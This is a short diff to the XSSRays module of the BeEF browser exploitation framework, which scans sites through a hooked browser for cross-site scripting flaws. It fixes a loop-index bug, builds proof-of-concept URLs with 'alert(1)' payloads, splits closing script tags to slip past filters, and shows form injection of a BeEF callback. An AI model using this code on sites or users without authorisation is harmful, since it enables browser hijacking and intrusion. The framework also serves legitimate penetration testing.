@@ -234,7 +234,7 @@ beef.net.xssrays = {
                     for (var k = 0; k < this.vectors.length; k++) {
 
                         // skip the current vector if it's not compatible with the hooked browser
-                        if (!this.checkBrowser(i)){
+                        if (!this.checkBrowser(k)){
                             beef.net.xssrays.printDebug("Skipping vector [" + this.vectors[i].name + "] because it's not compatible with the current browser.");
                             continue;
                         }
@@ -377,8 +377,8 @@ beef.net.xssrays = {
                 for (var i in params) {
                     if (params.hasOwnProperty(i)) {
 
-                        //poc = vector.input.replace(/XSS/g, "BUG");
-                        poc = "something";
+                        poc = vector.input.replace(/XSS/g, "alert(1)");
+                        poc = poc.replace(/<\/script>/g, "<\/scr\"+\"ipt>");
                         pocurl += i + '=' + (urlencode ? encodeURIComponent(poc) : poc); // + '&';
 
                         beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.poc = pocurl;
@@ -390,7 +390,6 @@ beef.net.xssrays = {
                         exploit = beef.net.xssrays.escape(vector.input.replace(/XSS/g, beefCallback));
                         form += '<textarea name="' + i + '">' + exploit + '<\/textarea>';
                         beef.net.xssrays.printDebug("form param[" + i + "] = " + params[i].toString());
-
 
                         paramsPos++;
                     }
